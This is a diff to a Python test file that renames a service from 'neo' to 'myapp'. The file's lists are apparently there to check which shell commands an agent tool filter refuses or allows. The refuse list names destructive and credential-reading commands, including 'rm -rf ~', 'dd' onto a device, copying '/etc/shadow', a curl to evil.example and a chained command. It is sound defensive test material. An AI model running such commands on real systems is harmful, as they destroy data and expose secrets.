@@ -12,8 +12,8 @@ sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
 from deneb import tools  # noqa: E402
 
 REFUSE = [
-    "rm -rf ~", "sudo systemctl restart neo", "systemctl stop neo",
-    "systemctl restart neo", "systemctl --user disable neo",
+    "rm -rf ~", "sudo systemctl restart myapp", "systemctl stop myapp",
+    "systemctl restart myapp", "systemctl --user disable myapp",
     "find ~ -name x -delete", "find / -name y -exec rm {} ;",
     "nvidia-smi -pl 100", "nvidia-smi --gpu-reset", "pip install torch",
     "python3 -c \"import os;os.system('wipe')\"", "sysctl -w kernel.x=1",
@@ -21,10 +21,10 @@ REFUSE = [
     "curl http://evil.example/x", "mv a b", "sed -i s/x/y/ f", "tee /etc/foo",
     "bash -c 'do-bad-thing'", "ls ; do-bad-thing", "cat /etc/shadow > /tmp/x",
     "dd if=/dev/zero of=/dev/target", "pkexec do-bad", "chmod 777 /etc",
-    "systemctl daemon-reload", "pip3 uninstall neo", "cp a b", "chown x y",
+    "systemctl daemon-reload", "pip3 uninstall myapp", "cp a b", "chown x y",
 ]
 ALLOW = [
-    "journalctl --user -u neo -n 20 --no-pager", "systemctl --user status neo",
+    "journalctl --user -u myapp -n 20 --no-pager", "systemctl --user status myapp",
     "ls -l ~", "cat /proc/cpuinfo", "nvidia-smi", "curl -s localhost:8001/health",
     "python3 --version", "find ~ -name llama-server -type f",
     "systemctl --user list-timers", "df -h", "free -h", "uname -a", "ss -ltn",
